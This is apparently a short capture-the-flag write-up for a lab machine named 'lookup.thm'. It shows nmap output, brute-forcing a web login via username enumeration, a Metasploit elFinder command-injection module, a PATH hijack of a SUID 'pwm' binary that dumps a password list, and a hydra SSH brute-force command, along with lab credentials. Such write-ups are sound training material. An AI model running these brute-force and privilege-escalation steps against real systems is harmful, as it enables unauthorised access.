---
tags:
  - Brute_Force
---

### Basic Enumeration
We willl start with nmap:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e1:9b:ba:40:d3:a9:2e:d8:de:46:54:b3:1c:f3:1d:29 (RSA)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Did not follow redirect to http://lookup.thm
```


### web enumeration 
After a while didn't find any thing, so start brute forcing the login page. When i have valid username it says wrong password but when i have both unvalid it says invalid usrname and password

`jose` : `password123`

Getting inside found file management CMS.
![[Z Assets/Images/Pasted image 20251029225912.jpeg]]

this version is outdataed, so we will use metasploit to exploit it.
```sh
msf > use unix/webapp/elfinder_php_connector_exiftran_cmd_injection
```


Found SUID bit on `/usr/sbin/pwm`. which check the UID of the user using `id` and extract the passwords stored in `~/.password`.
```sh
www-data@ip-10-10-250-23:/var$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found

```

Exploit is modify the `$PATH`, so it look where we want it to look to execute our commands.
```sh
export PATH='/var/www/html:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'
www-data@ip-10-10-250-23:/var/www/html$ id
uid=1000(think) gid=1000(think) groups=1000(think)

www-data@ip-10-10-250-23:/var/www/html$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
josemario.AKA(think)
jose1006
jose1004
jose1002
jose1001teles
```

ssh brute forcing
```sh
hydra -l think -P passwords lookup.thm ssh
```

`think` : `josemario.AKA(think)`

---

